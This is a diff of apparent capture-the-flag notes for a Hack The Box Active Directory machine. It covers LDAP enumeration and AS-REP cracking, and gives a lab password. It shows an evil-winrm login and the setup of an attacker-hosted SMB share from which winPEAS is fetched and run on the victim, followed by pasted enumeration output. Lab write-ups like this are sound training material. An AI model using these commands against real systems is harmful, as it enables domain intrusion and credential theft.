@@ -1,7 +1,8 @@
 #########
 he DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. 
 Kerberos pre-authentication disabled can be cracked to gain a foothold. 
-The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. 
+The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups.
+SMB File Share + Winpeas
 The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes. 
 #########
 
@@ -241,6 +242,65 @@ The Exchange group membership is leveraged to gain DCSync privileges on the doma
             NETLOGON        READ            Logon server share 
             SYSVOL          READ            Logon server share 
 
-    We will connect to check:
-        smbclient //10.10.10.161/NETLOGON -U 'htb.local\svc-alfresco%s3rvice'
+    Extact GPP Policy if exist
+            crackmapexec smb <IP> -u <username> -p <password> -M spider_plus
+
+            It give us 'GPT'
+
+
+2-Exploit:
+    We try to connect with alfresco cred via winrm:
+        evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+    
+    We have a shell we will navigate first
+
+    Because certutil doesn't work, we are in Powershell, We will create an smb server to download 'Winpeas' from Kali to windows machine:
+        on Kali:
+            mkdir smb
+            impacket-smbserver cool $(pwd) -smb2support -user admin -password admin
+
+
+        on Window:
+            *Evil-WinRM* PS C:\Windows\System32> $passwd = convertto-securestring 'admin' -AsPlainText -Force
+            *Evil-WinRM* PS C:\Windows\System32> $passwd
+                output
+
+            *Evil-WinRM* PS C:\Windows\System32> $cred = New-Object System.Management.Automation.PSCredential('admin', $passwd)
+            *Evil-WinRM* PS C:\Windows\System32> $cred
+                output 
+
+            New-PSDrive -Name admin -PSProvider FileSystem -Credential $cred -Root \\<KaliIP>\cool
+            
+            *Evil-WinRM* PS C:\> cd \\<KaliIP>\coolz
+            .\winPEASx64.exe
+
+    Windows Enumeration via Winpeas:
+            (Permission to write in):
+                C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])
+                    Folder: C:\windows\tasks
+                    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+                
+                    Folder: C:\windows\system32\tasks
+                    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+
+
+            (Unquoted and Space detected):<--- BUT WITHOUT W-E PERMISSION....................................................
+                RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+                Key: Common Startup
+                Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+
+            =================================================================================================
+
+                RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+                Key: Common Startup
+                Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+
+            =================================================================================================
+
+                Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+                File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+
+
+
+
 
